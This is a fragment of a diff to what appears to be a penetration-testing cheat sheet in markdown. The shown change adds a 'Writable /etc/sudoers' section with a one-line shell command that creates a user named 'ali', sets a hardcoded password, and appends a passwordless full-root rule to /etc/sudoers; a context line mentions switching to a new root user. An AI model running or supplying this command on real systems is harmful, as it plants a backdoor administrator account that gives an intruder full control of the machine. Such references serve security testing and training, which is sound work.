@@ -145,6 +145,10 @@ password=Mobin@
 
 su <username> ( Switch to new root user )
 ```
+### Writable /etc/sudoers ✡️
+```bash
+useradd ali && (echo -e 'Mobin@\nMobin@' | passwd ali) && (echo "ali ALL=(ALL:ALL) NOPASSWD:ALL" >> /etc/sudoers)
+```
 
 # service ✅📚
 ## SMB ✅
